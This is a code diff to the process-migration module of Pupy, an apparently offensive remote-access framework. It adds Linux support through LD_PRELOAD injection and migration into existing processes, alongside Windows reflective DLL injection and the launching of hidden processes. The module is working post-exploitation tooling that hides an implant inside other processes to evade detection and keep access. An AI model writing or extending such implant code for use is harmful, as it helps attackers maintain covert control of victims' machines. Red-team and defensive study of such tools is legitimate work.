@@ -1,34 +1,50 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 from pupylib.PupyModule import *
 import pupygen
 import os.path
 import time
-from modules.lib.windows.migrate import migrate
+from modules.lib.windows.migrate import migrate as win_migrate
+from modules.lib.linux.migrate import migrate as lin_migrate
+from modules.lib.linux.migrate import ld_preload
 
 __class_name__="MigrateModule"
 
 
-@config(cat="manage", compat="windows")
+@config(cat="manage", compat=["linux", "windows"])
 class MigrateModule(PupyModule):
     """ Migrate pupy into another process using reflective DLL injection """
     max_clients=1
-    dependencies=["psutil", "pupwinutils.processes"]
+    dependencies={
+        'windows': ['psutil', 'pupwinutils.processes']
+    }
+
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="migrate", description=self.__doc__)
+        self.arg_parser.add_argument('-w', '--wait', action='store_true', default=False,
+                            help='Hook exit thread function and wait until pupy exists (Linux)')
+
         group = self.arg_parser.add_mutually_exclusive_group(required=True)
-        group.add_argument('-c', '--create', metavar='<exe_path>',help='create a new process and inject into it')
+        group.add_argument('-c', '--create', metavar='<exe_path>',
+                            help='create a new process and inject into it')
         group.add_argument('pid', nargs='?', type=int, help='pid')
         self.arg_parser.add_argument('-k', '--keep', action='store_true' ,help='migrate into the process but create a new session and keep the current pupy session running')
 
     def run(self, args):
-        pid=None
-        if args.create:
-            p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.create)
-            pid=p.pid
-            self.success("%s created with pid %s"%(args.create,pid))
-        else:
-            pid=args.pid
-        migrate(self, pid, args.keep)
-
-
-
+        if self.client.is_windows():
+            pid=None
+            if args.create:
+                self.success("Migrating to new windows process")
+                p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.create)
+                pid=p.pid
+                self.success("%s created with pid %s"%(args.create,pid))
+            else:
+                self.success("Migrating to existing windows process")
+                pid=args.pid
+            win_migrate(self, pid, args.keep)
+        elif self.client.is_linux():
+            if args.create:
+                self.success("Migrating to new linux process")
+                ld_preload(self, args.create, wait_thread=args.wait, keep=args.keep)
+            else:
+                self.success("Migrating to existing linux process")
+                lin_migrate(self, args.pid, args.keep)
